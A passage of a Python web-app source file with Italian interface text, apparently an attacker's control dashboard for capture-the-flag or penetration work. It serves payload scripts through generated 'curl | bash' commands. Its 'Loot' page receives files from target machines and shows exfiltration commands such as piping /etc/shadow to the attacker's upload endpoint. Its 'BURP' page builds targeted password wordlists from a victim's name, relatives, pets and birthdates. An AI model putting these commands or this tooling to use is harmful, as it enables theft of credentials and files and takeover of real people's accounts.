      '</div><span style="font-size:11px;color:var(--text2);width:28px;text-align:right">'+v+'%</span></div>';
  }};
  function renderPet(pet){{
    var u=parseFloat(pet.updated)||0;
    var el=u>0?Math.max(0,Date.now()/1000-u):0;
    var tk=Math.floor(el/600);
    var h=Math.max(0,Math.min(100,(pet.happiness||50)-tk));
    var f=Math.max(0,Math.min(100,(pet.fullness||50)-tk));
    var nm=document.getElementById('pet-home-name');
    nm.textContent=pet.name||'SeaLion';
    nm.onclick=function(){{location.href='/pet';}};
    document.getElementById('pet-home-bars').innerHTML=bar('Felicità',h)+bar('Sazietà',f);
    w.style.display='';
  }}
  try{{
    var raw=localStorage.getItem('sl_pet');
    var pet=raw?JSON.parse(raw):{{name:'SeaLion',happiness:50,fullness:50,updated:0}};
    if(!raw)localStorage.setItem('sl_pet',JSON.stringify(pet));
    renderPet(pet);
    fetch('/api/pet').then(function(r){{return r.json();}}).then(function(srv){{
      var su=parseFloat(srv.updated)||0;
      var lu=parseFloat(pet.updated)||0;
      if(su>lu){{
        localStorage.setItem('sl_pet',JSON.stringify(srv));
        renderPet(srv);
      }}
    }}).catch(function(){{}});
  }}catch(e){{}}
}})();
(function(){{
  var art=document.querySelector('.seal-art');
  if(!art)return;
  var orig=art.textContent;
  var frames={wag_json};
  var seq=[2,3,4,3,2,1,0,1];
  var tid=null,fi=0,barking=false;
  var barkFrame1={bark1_json};
  var barkFrame2={bark2_json};
  function wag(){{art.textContent=frames[seq[fi%seq.length]];fi++;}}
  function doBark(){{
    barking=true;art.textContent=orig;
    var bs=[barkFrame1,barkFrame2,barkFrame1,barkFrame2,barkFrame1,barkFrame2,barkFrame1,barkFrame2];
    var bi=0;
    var bt=setInterval(function(){{
      if(bi<bs.length){{art.textContent=bs[bi];bi++;}}
      else{{clearInterval(bt);art.textContent=orig;barking=false;}}
    }},200);
  }}
  function start(e){{e.preventDefault();if(tid||barking)return;fi=0;wag();tid=setInterval(wag,200);}}
  function stop(){{
    if(tid){{clearInterval(tid);tid=null;}}
    doBark();
  }}
  art.addEventListener('mousedown',start);
  art.addEventListener('mouseup',stop);
  art.addEventListener('mouseleave',function(){{if(tid){{clearInterval(tid);tid=null;}}art.textContent=orig;}});
  art.addEventListener('touchstart',start,{{passive:false}});
  art.addEventListener('touchend',stop);
}})();
</script>"""
    return _base_html("Home", body, active="home")


def _page_list(title: str, section: str, items: list[tuple[str, str]], descriptions: dict[str, str] | None = None) -> str:
    lis = ""
    for key, name in items:
        desc = ""
        if descriptions and key in descriptions:
            desc = f'<span class="item-desc">&mdash; {html.escape(descriptions[key])}</span>'
        lis += f'<li><a href="/{section}/{key}/"><span class="item-name">{html.escape(name)}</span>{desc}</a></li>\n'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> {html.escape(title)}</div>
<div class="page-title">{html.escape(title)}</div>
<div class="page-sub">{len(items)} elementi</div>
<ul class="item-list">{lis}</ul>
</div>"""
    return _base_html(title, body, active=section)


def _page_md(section: str, section_label: str, name: str, md_text: str) -> str:
    safe_md = md_text.replace("\\", "\\\\").replace("`", "\\`").replace("$", "\\$").replace("</", "<\\/")
    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/{section}/">{html.escape(section_label)}</a> <span>/</span> {html.escape(name)}</div>
<div class="md-content" id="md-target"></div>
<script>
document.getElementById('md-target').innerHTML=marked.parse(`{safe_md}`);
document.querySelectorAll('#md-target pre code').forEach(el=>{{if(typeof hljs!=='undefined')hljs.highlightElement(el);}});
document.querySelectorAll('#md-target table').forEach(t=>{{const w=document.createElement('div');w.className='table-scroll';t.parentNode.insertBefore(w,t);w.appendChild(t);}});
(function(){{
  const q=new URLSearchParams(location.search).get('q');
  if(!q)return;
  const re=new RegExp('('+q.replace(/[.*+?^${{}}()|[\\]\\\\]/g,'\\\\$&')+')','gi');
  const root=document.getElementById('md-target');
  const walk=document.createTreeWalker(root,NodeFilter.SHOW_TEXT,null);
  const nodes=[];
  while(walk.nextNode())nodes.push(walk.currentNode);
  let first=null;
  nodes.forEach(n=>{{
    if(n.parentNode.tagName==='CODE'||n.parentNode.tagName==='PRE')return;
    if(!re.test(n.nodeValue))return;
    re.lastIndex=0;
    const frag=document.createDocumentFragment();
    let last=0,m;
    while((m=re.exec(n.nodeValue))!==null){{
      if(m.index>last)frag.appendChild(document.createTextNode(n.nodeValue.slice(last,m.index)));
      const mark=document.createElement('mark');
      mark.className='search-hl';
      mark.textContent=m[1];
      frag.appendChild(mark);
      if(!first)first=mark;
      last=re.lastIndex;
    }}
    if(last<n.nodeValue.length)frag.appendChild(document.createTextNode(n.nodeValue.slice(last)));
    n.parentNode.replaceChild(frag,n);
  }});
  if(first)setTimeout(()=>first.scrollIntoView({{behavior:'smooth',block:'center'}}),150);
}})();
</script>
</div>"""
    return _base_html(name, body, active=section)


def _page_static_list() -> str:
    files = []
    if STATIC_ROOT.is_dir():
        files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))

    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = ""

    cards = ""
    for f in files:
        size = f.stat().st_size
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        name = f.name
        if name.endswith(".sh"):
            cmd = f"curl {base}/{name} | bash"
        elif name.endswith(".exe"):
            cmd = f"curl {base}/{name} -o {name}"
        else:
            cmd = f"curl {base}/{name} -o {name} && chmod +x {name}"
        ename = html.escape(name)
        cards += f"""<div class="file-card">
<div style="min-width:0;flex:1"><div class="fname">{ename}</div><div class="fcmd">{html.escape(cmd)}</div></div>
<div class="fsize" style="margin:0 12px">{label}</div>
<div class="actions">
<a class="btn" href="/static/edit/{ename}">Apri</a>
<button class="btn btn-danger" onclick="deleteFile('{ename}')">Elimina</button>
</div>
</div>\n"""

    if not files:
        cards = '<p style="color:var(--text2)">Nessun file. Crea un nuovo file o usa <code>serve fetch</code> dalla console.</p>'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Payload</div>
<div class="page-title">Payload</div>
<div class="page-sub">{len(files)} file disponibili</div>

<div class="btn-group">
<button class="btn btn-primary" onclick="openModal('new')">+ Nuovo file</button>
<button class="btn" onclick="openModal('import')">Importa file</button>
</div>

{cards}

<div class="modal-overlay" id="modal-new">
<div class="modal">
<h3>Nuovo file</h3>
<input type="text" id="new-fname" placeholder="Nome file (es. script.sh)">
<textarea id="new-content" placeholder="Contenuto del file..."></textarea>
<div class="modal-actions">
<button class="btn" onclick="closeModals()">Annulla</button>
<button class="btn btn-primary" onclick="createFile()">Crea</button>
</div>
</div>
</div>

<div class="modal-overlay" id="modal-import">
<div class="modal">
<h3>Importa file</h3>
<p style="color:var(--text2);font-size:14px;margin-bottom:12px">Seleziona uno o più file dal tuo computer.</p>
<input type="file" id="import-files" multiple style="margin-bottom:12px">
<div class="modal-actions">
<button class="btn" onclick="closeModals()">Annulla</button>
<button class="btn btn-primary" onclick="importFiles()">Importa</button>
</div>
</div>
</div>

<script>
function openModal(id){{document.getElementById('modal-'+id).classList.add('open');}}
function closeModals(){{document.querySelectorAll('.modal-overlay').forEach(m=>m.classList.remove('open'));}}
document.querySelectorAll('.modal-overlay').forEach(m=>{{
  m.addEventListener('click',e=>{{if(e.target===m)closeModals();}});
}});

function createFile(){{
  const name=document.getElementById('new-fname').value.trim();
  const content=document.getElementById('new-content').value;
  if(!name){{alert('Inserisci un nome file.');return;}}
  fetch('/api/static/save',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:name,content:content}})}})
  .then(r=>r.json()).then(d=>{{
    if(d.ok)location.reload();else alert(d.error);
  }});
}}

function importFiles(){{
  const input=document.getElementById('import-files');
  if(!input.files.length){{alert('Seleziona almeno un file.');return;}}
  const promises=[];
  for(const file of input.files){{
    const fd=new FormData();
    fd.append('file',file);
    promises.push(fetch('/api/static/upload',{{method:'POST',body:fd}}).then(r=>r.json()));
  }}
  Promise.all(promises).then(results=>{{
    const errors=results.filter(r=>!r.ok);
    if(errors.length)alert('Errori: '+errors.map(e=>e.error).join(', '));
    location.reload();
  }});
}}

function deleteFile(name){{
  if(!confirm('Eliminare '+name+'?'))return;
  fetch('/api/static/delete',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:name}})}})
  .then(r=>r.json()).then(d=>{{
    if(d.ok)location.reload();else alert(d.error);
  }});
}}
</script>
</div>"""
    return _base_html("Payload", body, active="static")


def _page_static_edit(name: str) -> str:
    fpath = STATIC_ROOT / name
    is_binary = False
    content = ""
    if fpath.is_file():
        try:
            content = fpath.read_text(encoding="utf-8", errors="strict")
        except (UnicodeDecodeError, ValueError):
            is_binary = True

    ename = html.escape(name)
    econtent = html.escape(content)

    if is_binary:
        editor = f"""<div class="editor-wrap">
<p style="color:var(--text2);margin:40px 0;text-align:center">
Questo file è binario e non può essere modificato nel browser.<br>
<a href="/{ename}" class="btn" style="margin-top:12px">Scarica</a>
</p></div>"""
    else:
        editor = f"""<div class="editor-wrap">
<textarea id="editor">{econtent}</textarea>
</div>"""

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/static/">Payload</a> <span>/</span> {ename}</div>
<div class="editor-topbar">
<span class="fname">{ename}</span>
<div>
<span class="save-status" id="save-status"></span>
<button class="btn btn-primary" id="save-btn" onclick="saveFile()"{"" if not is_binary else ' disabled'}>Salva</button>
</div>
</div>
{editor}
<script>
function saveFile(){{
  const btn=document.getElementById('save-btn');
  const status=document.getElementById('save-status');
  btn.disabled=true;status.textContent='Salvataggio...';
  fetch('/api/static/save',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:'{ename}',content:document.getElementById('editor').value}})
  }}).then(r=>r.json()).then(d=>{{
    btn.disabled=false;
    status.textContent=d.ok?'Salvato!':'Errore: '+d.error;
    setTimeout(()=>status.textContent='',3000);
  }}).catch(()=>{{btn.disabled=false;status.textContent='Errore di rete';}});
}}
document.getElementById('editor')?.addEventListener('keydown',e=>{{
  if((e.ctrlKey||e.metaKey)&&e.key==='s'){{e.preventDefault();saveFile();}}
  if(e.key==='Tab'){{
    e.preventDefault();
    const t=e.target,s=t.selectionStart,end=t.selectionEnd;
    t.value=t.value.substring(0,s)+'    '+t.value.substring(end);
    t.selectionStart=t.selectionEnd=s+4;
  }}
}});
</script>
</div>"""
    return _base_html(f"Edit — {name}", body, active="static")


def _search_all(query: str) -> list[dict]:
    """Search across notes, vuln, and tools. Return list of result dicts."""
    q = query.strip().lower()
    if not q:
        return []
    results: list[dict] = []

    for stem, display in _discover_notes():
        md_file = NOTES_ROOT / f"{stem}.md"
        if not md_file.is_file():
            continue
        text = md_file.read_text(encoding="utf-8", errors="replace")
        if q in text.lower() or q in stem.lower():
            ctx = _extract_search_context(text, q)
            results.append({"section": "notes", "name": display, "key": stem,
                            "href": f"/notes/{stem}/", "context": ctx})

    for stem, display in _discover_vulns():
        md_file = VULN_ROOT / f"{stem}.md"
        if not md_file.is_file():
            continue
        text = md_file.read_text(encoding="utf-8", errors="replace")
        if q in text.lower() or q in stem.lower():
            ctx = _extract_search_context(text, q)
            results.append({"section": "vuln", "name": display, "key": stem,
                            "href": f"/vuln/{stem}/", "context": ctx})

    for tname, display in _discover_tools():
        tool_dir = TOOL_ROOT / tname
        help_f = tool_dir / "help.md"
        if not help_f.exists():
            help_f = tool_dir / "help.txt"
        if not help_f.exists():
            continue
        text = help_f.read_text(encoding="utf-8", errors="replace")
        if q in text.lower() or q in tname.lower():
            ctx = _extract_search_context(text, q)
            results.append({"section": "tools", "name": display, "key": tname,
                            "href": f"/tools/{tname}/", "context": ctx})

    return results


def _extract_search_context(text: str, query_lower: str, max_len: int = 120) -> str:
    for line in text.splitlines():
        if query_lower in line.lower():
            s = line.strip()
            if s.startswith("#"):
                s = s.lstrip("# ")
            if len(s) > max_len:
                s = s[:max_len - 3] + "..."
            return s
    return ""


def _discover_loot() -> list[dict]:
    if not LOOT_ROOT.is_dir():
        return []
    items: list[dict] = []
    for f in sorted(LOOT_ROOT.iterdir(), key=lambda p: p.name, reverse=True):
        if not f.is_file() or f.name.startswith("."):
            continue
        size = f.stat().st_size
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        is_text = False
        preview = ""
        try:
            raw = f.read_bytes()[:512]
            raw.decode("utf-8", errors="strict")
            is_text = True
            preview = raw.decode("utf-8", errors="replace")[:200]
        except (UnicodeDecodeError, OSError):
            pass
        items.append({"name": f.name, "size": label, "bytes": size,
                       "is_text": is_text, "preview": preview})
    return items


def _save_loot_file(data: bytes, filename: str, client_ip: str) -> str:
    import time as _time
    LOOT_ROOT.mkdir(parents=True, exist_ok=True)
    ts = _time.strftime("%Y-%m-%d_%H-%M-%S")
    safe_name = Path(filename).name.replace("..", "").replace("/", "").replace("\\", "")
    if not safe_name:
        safe_name = "upload"
    dest_name = f"{client_ip}_{ts}_{safe_name}"
    dest = LOOT_ROOT / dest_name
    counter = 1
    while dest.exists():
        dest = LOOT_ROOT / f"{client_ip}_{ts}_{counter}_{safe_name}"
        counter += 1
    dest.write_bytes(data)
    return dest.name


def _page_loot() -> str:
    items = _discover_loot()

    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = ""

    rows = ""
    for it in items:
        ename = html.escape(it["name"])
        preview_html = ""
        if it["is_text"] and it["preview"]:
            preview_html = f'<div style="color:var(--text2);font-size:11px;margin-top:4px;white-space:pre-wrap;max-height:60px;overflow:hidden">{html.escape(it["preview"])}</div>'
        rows += f"""<div class="file-card">
<div style="min-width:0;flex:1"><div class="fname">{ename}</div>{preview_html}</div>
<div class="fsize" style="margin:0 12px">{it['size']}</div>
<div class="actions">
<a class="btn" href="/loot/view/{ename}">Apri</a>
<a class="btn" href="/loot/raw/{ename}">Scarica</a>
<button class="btn btn-danger" onclick="deleteLoot('{ename}')">Elimina</button>
</div>
</div>\n"""

    if not items:
        rows = '<p style="color:var(--text2)">Nessun file ricevuto. Usa <code>curl</code> dalla vulnbox per caricare file.</p>'

    curl_examples = ""
    if base:
        curl_examples = f"""<div style="margin:20px 0">
<h3 style="color:var(--text);margin-bottom:10px">Comandi dalla vulnbox</h3>
<div class="dc-cmd"><code>curl -F "file=@/path/file" {base}/upload</code></div>
<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload file singolo</div>
<div class="dc-cmd"><code>cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt</code></div>
<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload via pipe</div>
<div class="dc-cmd"><code>curl -T /tmp/db.sqlite {base}/upload/db.sqlite</code></div>
<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload con PUT</div>
</div>"""

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Loot</div>
<div class="page-title">Loot</div>
<div class="page-sub">{len(items)} file ricevuti dalla vulnbox</div>
{curl_examples}
<div class="btn-group">
<button class="btn btn-danger" onclick="if(confirm('Eliminare TUTTI i file loot?'))clearLoot()">Svuota loot</button>
</div>
{rows}
</div>
<script>
function deleteLoot(name){{
  if(!confirm('Eliminare '+name+'?'))return;
  fetch('/api/loot/delete',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:name}})}})
  .then(r=>r.json()).then(d=>{{if(d.ok)location.reload();else alert(d.error);}});
}}
function clearLoot(){{
  fetch('/api/loot/clear',{{method:'POST'}})
  .then(r=>r.json()).then(d=>{{if(d.ok)location.reload();else alert(d.error);}});
}}
</script>"""
    return _base_html("Loot", body, active="loot")


def _page_loot_view(name: str) -> str:
    fpath = LOOT_ROOT / name
    is_binary = False
    content = ""
    if fpath.is_file():
        try:
            content = fpath.read_text(encoding="utf-8", errors="strict")
        except (UnicodeDecodeError, ValueError):
            is_binary = True

    ename = html.escape(name)

    if is_binary:
        size = fpath.stat().st_size
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        viewer = f"""<div style="text-align:center;padding:40px 0;color:var(--text2)">
<p>File binario — {label}</p>
<a href="/loot/raw/{ename}" class="btn btn-primary" style="margin-top:12px">Scarica</a>
</div>"""
    else:
        viewer = f'<pre style="background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:14px;overflow-x:auto;font-size:12.5px;line-height:1.6;color:var(--text);white-space:pre-wrap;word-break:break-all">{html.escape(content)}</pre>'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/loot/">Loot</a> <span>/</span> {ename}</div>
<div class="page-title" style="word-break:break-all">{ename}</div>
{viewer}
</div>"""
    return _base_html(f"Loot — {name}", body, active="loot")



def _page_burp() -> str:
    body = """\
<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> BURP</div>
<div class="page-title">BURP</div>
<div class="page-sub">Better User Research Password — Profiler password avanzato</div>

<style>
.burp-section{border-bottom:1px solid var(--border);padding:16px 0}
.burp-section:last-of-type{border-bottom:none}
.burp-section-title{font-size:14px;font-weight:700;color:var(--accent);margin-bottom:10px}
.burp-field{display:flex;gap:8px;margin-bottom:8px;align-items:center}
.burp-field label{width:140px;flex-shrink:0;color:var(--text2);font-size:13px}
.burp-field input[type="text"],.burp-field input[type="number"]{flex:1;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:7px 10px;font-family:inherit;font-size:13px;outline:none}
.burp-field input:focus{border-color:var(--accent)}
.burp-family-block{border:1px solid var(--border);border-radius:6px;padding:12px;margin:8px 0}
.burp-add-btn{background:none;border:1px dashed var(--border);color:var(--accent);padding:6px 16px;border-radius:4px;cursor:pointer;font-size:12px;font-family:inherit}
.burp-add-btn:hover{border-color:var(--accent)}
.burp-remove-btn{background:none;border:none;color:#e55;cursor:pointer;font-size:18px;padding:0 8px;line-height:1}
.burp-level-row{display:flex;gap:6px;margin:12px 0}
.burp-level-btn{padding:7px 18px;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--surface);color:var(--text2);transition:all .15s;font-family:inherit}
.burp-level-btn:hover{border-color:var(--accent);color:var(--text)}
.burp-level-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.burp-generate-btn{background:var(--green,#4c9);color:#fff;border:none;padding:10px 30px;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
.burp-generate-btn:hover{opacity:.9}
.burp-generate-btn:disabled{opacity:.5;cursor:not-allowed}
.burp-result{margin-top:16px;border:1px solid var(--border);border-radius:6px;padding:16px}
.burp-result textarea{width:100%;height:300px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;font-family:'Fira Mono',monospace;font-size:13px;padding:10px;resize:vertical;outline:none;box-sizing:border-box}
.burp-policy-row{display:flex;gap:16px;flex-wrap:wrap;margin:8px 0}
.burp-policy-row label{display:flex;align-items:center;gap:6px;font-size:13px;color:var(--text2);cursor:pointer}
.burp-policy-row input[type="checkbox"]{accent-color:var(--accent)}
.burp-stats{display:flex;gap:16px;margin:8px 0 12px;font-size:13px;color:var(--text2);align-items:center;flex-wrap:wrap}
.burp-stats .count{color:var(--green,#4c9);font-weight:600}
.burp-level-desc{font-size:12px;color:var(--text2);margin:4px 0 12px}
</style>

<div id="burp-form">
<!-- Target -->
<div class="burp-section">
  <div class="burp-section-title">Target</div>
  <div class="burp-field"><label>Nome *</label><input type="text" id="b-first" placeholder="es. Mario"></div>
  <div class="burp-field"><label>Cognome</label><input type="text" id="b-last" placeholder="es. Rossi"></div>
  <div class="burp-field"><label>Soprannome</label><input type="text" id="b-nick" placeholder="es. SuperMario"></div>
  <div class="burp-field"><label>Data di nascita</label><input type="text" id="b-birth" placeholder="GG/MM/AAAA"></div>
</div>

<!-- Partners -->
<div class="burp-section">
  <div class="burp-section-title">Partner</div>
  <div id="b-partners"></div>
  <button class="burp-add-btn" onclick="addPerson('partners')">+ Aggiungi partner</button>
</div>

<!-- Children -->
<div class="burp-section">
  <div class="burp-section-title">Figli</div>
  <div id="b-children"></div>
  <button class="burp-add-btn" onclick="addPerson('children')">+ Aggiungi figlio/a</button>
</div>

<!-- Siblings -->
<div class="burp-section">
  <div class="burp-section-title">Fratelli / Sorelle</div>
  <div id="b-siblings"></div>
  <button class="burp-add-btn" onclick="addPerson('siblings')">+ Aggiungi fratello/sorella</button>
</div>

<!-- Parents -->
<div class="burp-section">
  <div class="burp-section-title">Genitori</div>
  <div id="b-parents"></div>
  <button class="burp-add-btn" onclick="addPerson('parents')">+ Aggiungi genitore</button>
</div>

<!-- Pets -->
<div class="burp-section">
  <div class="burp-section-title">Animali domestici</div>
  <div class="burp-field"><label>Nomi (virgola)</label><input type="text" id="b-pets" placeholder="es. Fido, Rex"></div>
</div>

<!-- Company + Keywords -->
<div class="burp-section">
  <div class="burp-section-title">Altro</div>
  <div class="burp-field"><label>Azienda</label><input type="text" id="b-company" placeholder="es. AcmeCorp"></div>
  <div class="burp-field"><label>Parole chiave</label><input type="text" id="b-keywords" placeholder="es. calcio, juventus, hacker"></div>
</div>

<!-- Policy -->
<div class="burp-section">
  <div class="burp-section-title">Filtro Policy <span style="font-weight:400;font-size:12px;color:var(--text2)">— regole del sito target (tieni solo password valide)</span></div>
  <div class="burp-field"><label>Min lunghezza</label><input type="number" id="b-minlen" value="0" min="0" style="width:80px;flex:none"></div>
  <div class="burp-field"><label>Max lunghezza</label><input type="number" id="b-maxlen" value="0" min="0" style="width:80px;flex:none"></div>
  <div class="burp-policy-row">
    <label><input type="checkbox" id="b-req-alpha" checked> Includi lettere</label>
    <label><input type="checkbox" id="b-req-upper" checked> Includi maiuscole</label>
    <label><input type="checkbox" id="b-req-digit" checked> Includi numeri</label>
    <label><input type="checkbox" id="b-req-special" checked> Includi speciali (!@#$)</label>
  </div>
</div>

<!-- Level + Generate -->
<div class="burp-section" style="border-bottom:none">
  <div class="burp-section-title">Livello</div>
  <div class="burp-level-row">
    <button class="burp-level-btn" data-level="fast" onclick="setLevel(this)">Fast</button>
    <button class="burp-level-btn active" data-level="medium" onclick="setLevel(this)">Medium</button>
    <button class="burp-level-btn" data-level="full" onclick="setLevel(this)">Full</button>
  </div>
  <div class="burp-level-desc" id="b-level-desc">~2k-15k password — cross-group, leet parziale, prefissi</div>
  <div id="b-estimates" style="display:none;margin:10px 0;font-size:13px;color:var(--text2)">
    <span style="margin-right:16px">fast: <b id="b-est-fast">-</b></span>
    <span style="margin-right:16px">medium: <b id="b-est-medium">-</b></span>
    <span>full: <b id="b-est-full">-</b></span>
  </div>
  <div style="margin-top:16px">
    <button class="burp-generate-btn" id="b-gen-btn" onclick="doGenerate()">Genera Wordlist</button>
    <span id="b-spinner" style="display:none;margin-left:12px;color:var(--text2)">Generazione...</span>
  </div>
</div>

<!-- Results -->
<div class="burp-result" id="b-result" style="display:none">
  <div class="burp-stats">
    <span>Password generate: <span class="count" id="b-count">0</span></span>
    <button class="burp-add-btn" onclick="downloadWordlist()">Download .txt</button>
    <button class="burp-add-btn" onclick="copyWordlist()">Copia</button>
  </div>
  <textarea id="b-output" readonly></textarea>
</div>
</div>
</div>

<script>
(function(){
  var level='medium';
  var generated=[];
  var LEVEL_DESC={
    fast:'combo base, suffissi comuni',
    medium:'cross-group, leet parziale, prefissi',
    full:'tutto: permutazioni, leet, reverse'
  };
  var lastEstimates=null;

  function updateLevelDesc(){
    var desc=LEVEL_DESC[level]||'';
    if(lastEstimates&&lastEstimates[level]){
      desc=lastEstimates[level].toLocaleString()+' password — '+desc;
    }
    document.getElementById('b-level-desc').textContent=desc;
  }

  window.setLevel=function(btn){
    document.querySelectorAll('.burp-level-btn').forEach(function(b){b.classList.remove('active')});
    btn.classList.add('active');
    level=btn.dataset.level;
    updateLevelDesc();
  };

  window.addPerson=function(group){
    var container=document.getElementById('b-'+group);
    var idx=container.children.length;
    var block=document.createElement('div');
    block.className='burp-family-block';
    block.innerHTML=
      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">'+
      '<span style="font-size:12px;color:var(--text2)">#'+(idx+1)+'</span>'+
      '<button class="burp-remove-btn" onclick="this.closest(\\'.burp-family-block\\').remove()">&times;</button>'+
      '</div>'+
      '<div class="burp-field"><label>Nome</label><input type="text" class="fp-name" placeholder="Nome"></div>'+
      '<div class="burp-field"><label>Cognome</label><input type="text" class="fp-surname" placeholder="Cognome"></div>'+
      '<div class="burp-field"><label>Soprannome</label><input type="text" class="fp-nick" placeholder="Soprannome"></div>'+
      '<div class="burp-field"><label>Data nascita</label><input type="text" class="fp-birth" placeholder="GG/MM/AAAA"></div>';
    container.appendChild(block);
  };

  function collectPeople(group){
    var blocks=document.querySelectorAll('#b-'+group+' .burp-family-block');
    var people=[];
    blocks.forEach(function(b){
      var name=b.querySelector('.fp-name').value.trim();
      if(!name)return;
      people.push({
        name:name,
        surname:b.querySelector('.fp-surname').value.trim(),
        nickname:b.querySelector('.fp-nick').value.trim(),
        birthdate:b.querySelector('.fp-birth').value.trim()
      });
    });
    return people;
  }

  function buildProfile(){
    return {
      first_name:document.getElementById('b-first').value.trim(),
      last_name:document.getElementById('b-last').value.trim(),
      nickname:document.getElementById('b-nick').value.trim(),
      birthdate:document.getElementById('b-birth').value.trim(),
      partners:collectPeople('partners'),
      children:collectPeople('children'),
      siblings:collectPeople('siblings'),
      parents:collectPeople('parents'),
      pets:document.getElementById('b-pets').value.split(',').map(function(s){return s.trim()}).filter(Boolean),
      company:document.getElementById('b-company').value.trim(),
      keywords:document.getElementById('b-keywords').value.split(',').map(function(s){return s.trim()}).filter(Boolean),
      min_length:parseInt(document.getElementById('b-minlen').value)||0,
      max_length:parseInt(document.getElementById('b-maxlen').value)||0,
      allow_alpha:document.getElementById('b-req-alpha').checked,
      allow_upper:document.getElementById('b-req-upper').checked,
      allow_digit:document.getElementById('b-req-digit').checked,
      allow_special:document.getElementById('b-req-special').checked
    };
  }

  window.doGenerate=function(){
    var profile=buildProfile();
    if(!profile.first_name){alert('Nome obbligatorio');return;}
    var btn=document.getElementById('b-gen-btn');
    var spinner=document.getElementById('b-spinner');
    btn.disabled=true;
    spinner.style.display='inline';
    spinner.textContent='Calcolo stime...';
    doEstimate(function(){
      spinner.textContent='Generazione...';
      fetch('/api/burp/generate',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({profile:profile,level:level})
      })
    .then(function(r){return r.json()})
    .then(function(data){
      if(data.ok){
        generated=data.passwords;
        document.getElementById('b-count').textContent=generated.length.toLocaleString();
        document.getElementById('b-output').value=generated.join('\\n');
        document.getElementById('b-result').style.display='block';
      }else{
        alert('Errore: '+(data.error||'sconosciuto'));
      }
    })
    .catch(function(e){alert('Errore di rete: '+e.message)})
    .finally(function(){btn.disabled=false;spinner.style.display='none'});
    });
  };

  window.downloadWordlist=function(){
    var blob=new Blob([generated.join('\\n')],{type:'text/plain'});
    var url=URL.createObjectURL(blob);
    var a=document.createElement('a');
    a.href=url;
    a.download=(document.getElementById('b-first').value.trim()||'target')+'_burp.txt';
    a.click();
    URL.revokeObjectURL(url);
  };

  window.copyWordlist=function(){
    navigator.clipboard.writeText(generated.join('\\n')).then(function(){
      var btn=event.target;
      var old=btn.textContent;
      btn.textContent='Copiato!';
      setTimeout(function(){btn.textContent=old},1500);
    });
  };

  window.doEstimate=function(cb){
    var profile=buildProfile();
    if(!profile.first_name){if(cb)cb();return;}
    fetch('/api/burp/estimate',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({profile:profile})
    })
    .then(function(r){return r.json()})
    .then(function(data){
      if(data.ok){
        lastEstimates=data.counts;
        document.getElementById('b-est-fast').textContent=data.counts.fast.toLocaleString();
        document.getElementById('b-est-medium').textContent=data.counts.medium.toLocaleString();
        document.getElementById('b-est-full').textContent=data.counts.full.toLocaleString();
        document.getElementById('b-estimates').style.display='block';
        updateLevelDesc();
        if(cb)cb();
      }
    })
    .catch(function(){if(cb)cb()});
  };

  var _estTimer=null;
  function scheduleEstimate(){
    clearTimeout(_estTimer);
    _estTimer=setTimeout(function(){doEstimate()},600);
  }
  document.querySelectorAll('#b-first,#b-last,#b-nick,#b-birth,#b-pets,#b-company,#b-keywords,#b-minlen,#b-maxlen').forEach(function(el){
    el.addEventListener('input',scheduleEstimate);
  });
  document.querySelectorAll('#b-req-alpha,#b-req-upper,#b-req-digit,#b-req-special').forEach(function(el){
    el.addEventListener('change',scheduleEstimate);
  });
  var _famObs=new MutationObserver(function(muts){
    var dominated=false;
    muts.forEach(function(m){if(m.addedNodes.length||m.removedNodes.length)dominated=true;});
    if(dominated)scheduleEstimate();
  });
  ['b-partners','b-children','b-siblings','b-parents'].forEach(function(id){
    _famObs.observe(document.getElementById(id),{childList:true,subtree:true});
  });
  document.addEventListener('input',function(e){
    if(e.target.classList.contains('fp-name')||e.target.classList.contains('fp-surname')||
       e.target.classList.contains('fp-nick')||e.target.classList.contains('fp-birth')){
      scheduleEstimate();
    }
  });

  function autoSlashDate(input){
    input.addEventListener('input',function(){
      var v=this.value.replace(/[^0-9]/g,'');
      if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);
      if(v.length>5)v=v.slice(0,5)+'/'+v.slice(5);
      if(v.length>10)v=v.slice(0,10);
      this.value=v;
    });
  }
  autoSlashDate(document.getElementById('b-birth'));
  var obs=new MutationObserver(function(){
